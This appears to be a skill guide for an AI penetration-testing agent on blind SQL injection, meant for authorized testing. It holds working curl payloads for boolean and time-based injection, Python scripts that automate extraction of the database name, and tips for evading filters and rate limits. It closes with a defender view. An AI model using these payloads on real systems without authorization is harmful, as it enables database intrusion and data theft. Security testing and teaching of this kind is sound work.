---
name: sqli-blind
description: Use when SQL injection is confirmed but the application prints
  no query output, so data must be extracted bit by bit during an authorized
  test. Covers boolean-based extraction with true and false page
  differences, time-based extraction with conditional delays, binary search
  to cut request counts, and stdlib Python automation loops. Use when UNION
  output is not visible, when errors are suppressed, when only login success
  or failure differs, or when you confirmed blind injection with
  sqli-detection.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: 2026-10-23
parent: web-sqli
requires: [web-sqli]
extends: []
relates: [api-security-testing]
tools:
  - name: curl
    version: 8.5
  - name: Python
    version: 3.12
  - name: sqlmap
    version: 1.9.2
---

Blind SQL injection extracts data through side channels: a page that changes
between true and false answers (boolean blind) or a response that takes
longer on true answers (time blind). This skill covers both, for authorized
tests only, including the Python automation that makes blind extraction
practical and the binary search trick that halves the request count. It
assumes injection is already confirmed; detection is covered by
sqli-detection, and visible-output cases belong to sqli-union-extraction.

## Quick Workflow

1. Confirm the blind channel: a repeatable true/false difference or a
   repeatable timing difference.
2. Pick boolean blind when any page difference exists; pick time blind only
   when nothing else differs.
3. Write the true/false oracle: one request that answers one yes/no
   question about the data.
4. Extract short values first (database name, user, version) to validate the
   oracle.
5. Enumerate schema objects with binary search on character codes.
6. Dump only the minimum data needed, with delays between requests to avoid
   hammering the target.
7. Log request counts and timing so the report shows the work was controlled.

## 1. Boolean-based blind extraction

The oracle is a payload that makes the page show state A on true and state B
on false. Everything else is asking questions.

```bash
# Confirm the oracle: true shows the welcome text, false does not
curl -s "https://target.example/item?id=5%20AND%201%3D1--%20-" | grep -c 'Welcome'
curl -s "https://target.example/item?id=5%20AND%201%3D2--%20-" | grep -c 'Welcome'

# Ask: is the first character of the database name 's'?
curl -s "https://target.example/item?id=5%20AND%20SUBSTRING(database(),1,1)%3D's'--%20-" | grep -c 'Welcome'
```

Automate with stdlib Python. Never do this by hand beyond the first few
characters.

```python
#!/usr/bin/env python3
"""Boolean-blind extractor: recovers the current database name."""
import time
import urllib.request
import urllib.parse

BASE = "https://target.example/item?id=5"
TRUE_MARKER = b"Welcome"
DELAY = 0.3

def ask(payload):
    url = BASE + urllib.parse.quote(payload, safe="()=',")
    with urllib.request.urlopen(url, timeout=20) as r:
        body = r.read()
    time.sleep(DELAY)
    return TRUE_MARKER in body

result = ""
for pos in range(1, 33):
    found = False
    for c in "abcdefghijklmnopqrstuvwxyz0123456789_":
        if ask(f" AND SUBSTRING(database(),{pos},1)='{c}'-- -"):
            result += c
            found = True
            break
    if not found:
        break
    print(f"[*] so far: {result}", flush=True)
```

Binary search on ASCII codes cuts roughly 5x requests versus alphabet scan:
ask `ASCII(SUBSTRING(...)) > 109` style questions and narrow the range.

## 2. Time-based blind extraction

Use conditional delays when the page is identical for true and false.

```bash
# MySQL: 3 second delay only when the condition is true
time curl -s "https://target.example/item?id=5%20AND%20IF(1%3D1,SLEEP(3),0)--%20-" -o /dev/null
time curl -s "https://target.example/item?id=5%20AND%20IF(1%3D2,SLEEP(3),0)--%20-" -o /dev/null

# PostgreSQL stacked time probe
time curl -s "https://target.example/item?id=5%3BSELECT%20CASE%20WHEN%20(1%3D1)%20THEN%20pg_sleep(3)%20END--%20-" -o /dev/null

# MSSQL
time curl -s "https://target.example/item?id=5%3BIF(1%3D1)%20WAITFOR%20DELAY%20'0:0:3'--%20-" -o /dev/null
```

```python
#!/usr/bin/env python3
"""Time-blind oracle: true answer when the response is slow."""
import time
import urllib.request
import urllib.parse

BASE = "https://target.example/item?id=5"
THRESHOLD = 2.0  # seconds; true means slower than this

def ask_time(payload):
    url = BASE + urllib.parse.quote(payload, safe="()=,'")
    start = time.time()
    with urllib.request.urlopen(url, timeout=30) as r:
        r.read()
    return (time.time() - start) > THRESHOLD

# Example: binary search one character of the database name
lo, hi = 32, 126
while lo < hi:
    mid = (lo + hi) // 2
    if ask_time(f" AND IF(ASCII(SUBSTRING(database(),1,1))>{mid},SLEEP(3),0)-- -"):
        lo = mid + 1
    else:
        hi = mid
print("[*] first char code:", lo, "->", chr(lo))
```

Keep delays at 2 to 4 seconds. Longer delays multiply across thousands of
requests and can look like a denial of service. Never run time-blind loops
during business hours unless the scope explicitly allows it.

## 3. Reducing request volume

Blind extraction is request-heavy, so economize deliberately.

```bash
# Extract hex-encoded data: smaller alphabet (0-9a-f), fewer questions per char
# SUBSTRING(HEX(password),pos,1) with a 16-char alphabet

# Ask about lengths first so loops know when to stop
# Boolean: AND (SELECT LENGTH(database()))=8-- -
# Time: AND IF((SELECT LENGTH(database()))=8,SLEEP(3),0)-- -
```

Prefer extracting hashes over plaintext where the goal is only to prove
access, and stop at the first row that proves impact. A full table dump over
a blind channel is rarely justified and always noisy.

## Edge cases

- The true/false marker appears on both pages intermittently. The marker is
  unreliable; pick a different string or compare response lengths with a
  tolerance band instead.
- Network jitter ruins time measurements. Take the median of three runs per
  question and raise the threshold to twice the baseline response time.
- The application caches responses. Add a cache-busting junk parameter that
  is not part of the query (`&x=RANDOM`) to every request.
- Length limits truncate your payload. Split long questions across stacked
  queries or shorten them with aliases.
- The session expires mid-loop. Re-authenticate inside the script and retry
  the current question instead of restarting.

## Escalation

- Boolean blind returns nothing useful: verify the oracle still works with
  `AND 1=1` versus `AND 1=2` before assuming the technique failed; the
  injection point may have moved.
- Time blind is too slow for the test window: switch to error-based
  extraction if any error text leaks, or escalate to out-of-band extraction
  (see sqli-out-of-band) which returns whole values per request.
- The filter blocks SLEEP and BENCHMARK: try heavy queries such as
  `(SELECT COUNT(*) FROM information_schema.columns A,
  information_schema.columns B)` as a timing source.
- Automation gets rate limited: add exponential backoff, lower concurrency
  to one request at a time, and continue from the saved position file.

## Detection and defender view

Defenders see blind extraction as thousands of near-identical requests from
one IP with slowly varying payloads, often at regular intervals from a
script. Time-based attacks also show as database sessions with long-running
`SLEEP` or `pg_sleep` calls in the slow query log. Alerting on request
bursts per session, slow query monitoring, and WAF rules against timing
functions all help. The durable fix remains parameterized queries plus
least-privilege database accounts.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application).
- CWE-89 (Improper Neutralization of Special Elements used in an SQL
  Command, SQL Injection).
- OWASP Testing Guide: Testing for Blind SQL Injection.
- PortSwigger Web Security Academy: Blind SQL injection labs.
